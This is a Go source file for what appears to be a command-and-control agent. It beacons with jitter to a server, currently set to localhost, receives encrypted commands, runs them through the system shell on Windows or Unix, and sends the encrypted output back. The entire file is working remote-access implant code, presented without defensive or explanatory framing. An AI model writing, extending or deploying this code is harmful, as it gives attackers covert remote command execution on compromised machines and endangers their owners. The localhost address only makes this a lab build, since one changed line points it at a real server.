package main

import (
	"X/internal/crypto"
	"bytes"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var (
	serverURL = "http://localhost:8080/api/v1/ping"
	resultURL = "http://localhost:8080/api/v1/result"
	agentID   string
	hostname  string
)

func main() {
	var err error
	hostname, err = os.Hostname()
	if err != nil {
		hostname = "unknown"
	}

	agentID = generateAgentID()

	fmt.Printf("[*] Agent Started → ID: %s | Host: %s | OS: %s\n", agentID, hostname, runtime.GOOS)

	rand.Seed(time.Now().UnixNano())

	for {
		taskID, encryptedCommand := checkIn()

		if taskID != "" && encryptedCommand != "" {
			command, err := crypto.Decrypt(encryptedCommand)
			if err != nil {
				fmt.Printf("[X] Decryption failed for task %s\n", taskID)
			} else {
				fmt.Printf("[+] Task %s → %s\n", taskID, command)
				output := executeCommand(command)
				if encryptedOutput, err := crypto.Encrypt(output); err == nil {
					sendResult(taskID, encryptedOutput)
				}
			}
		}

		jitter := rand.Intn(6)
		time.Sleep(time.Duration(8+jitter) * time.Second)
	}
}

func generateAgentID() string {
	randNum := rand.Intn(9999) + 1000
	return fmt.Sprintf("agent-%s-%d", hostname, randNum)
}

func checkIn() (string, string) {
	client := &http.Client{Timeout: 10 * time.Second}

	req, _ := http.NewRequest("POST", serverURL, nil)
	req.Header.Set("X-Agent-ID", agentID)
	req.Header.Set("X-Hostname", hostname)

	resp, err := client.Do(req)
	if err != nil {
		return "", ""
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return "", ""
	}

	body, _ := io.ReadAll(resp.Body)
	parts := strings.SplitN(string(body), "|", 2)

	if len(parts) == 2 && parts[0] != "" {
		return parts[0], parts[1]
	}
	return "", ""
}

func executeCommand(cmdStr string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", cmdStr)
	} else {
		cmd = exec.Command("sh", "-c", cmdStr)
	}

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	cmd.Run()

	output := strings.TrimSpace(out.String())
	if output == "" {
		return "[+] Success (No output)"
	}
	return output
}

func sendResult(taskID, encryptedOutput string) {
	req, _ := http.NewRequest("POST", resultURL, strings.NewReader(encryptedOutput))
	req.Header.Set("X-Task-ID", taskID)

	client := &http.Client{Timeout: 10 * time.Second}
	client.Do(req)
}
